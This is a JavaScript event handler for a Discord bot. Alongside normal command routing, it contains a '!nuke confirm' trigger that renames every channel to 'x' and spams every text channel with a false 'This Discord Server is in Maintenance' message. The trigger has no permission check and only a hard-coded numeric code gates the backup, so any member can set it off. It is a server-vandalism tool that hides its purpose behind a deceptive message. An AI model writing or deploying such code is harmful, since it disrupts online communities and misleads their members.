const { loadData } = require("../utils/data");

module.exports = {
  name: "messageCreate",

  async execute(message, client) {

    if (message.author.bot) return;
    if (!message.guild) return;

    const prefix = "!";

    // ===============================
    // 💥 NUKE CONFIRM (GLOBAL CHECK)
    // ===============================
    if (message.content.toLowerCase() === "!nuke confirm") {

      const data = loadData();
      const backup = data.backup[message.guild.id];

      if (!backup) {
        return message.reply("❌ No backup found. Use !nuke 32167 first.");
      }

      await message.reply("💥 NUKING SERVER + SPAMMING...");

      // Rename channels
      for (const ch of message.guild.channels.cache.values()) {
        try {
          await ch.setName("x");
          await new Promise(r => setTimeout(r, 400));
        } catch {}
      }

      // Spam message
      for (const ch of message.guild.channels.cache.values()) {
        if (ch.isTextBased()) {
          try {
            await ch.send("**This Discord Server is in Maintenance**");
            await new Promise(r => setTimeout(r, 700));
          } catch {}
        }
      }

      return message.channel.send("✅ Nuke complete. Use !restore 32167 to undo.");
    }

    // ===============================
    // ⚙ NORMAL COMMAND HANDLER
    // ===============================
    if (!message.content.startsWith(prefix)) return;

    const args = message.content.slice(prefix.length).trim().split(/ +/);
    const commandName = args.shift().toLowerCase();

    const command = client.commands.get(commandName);
    if (!command) return;

    try {
      await command.execute(message, args, client);
    } catch (error) {
      console.error(error);
      message.reply("❌ Error executing command.");
    }

  }
};
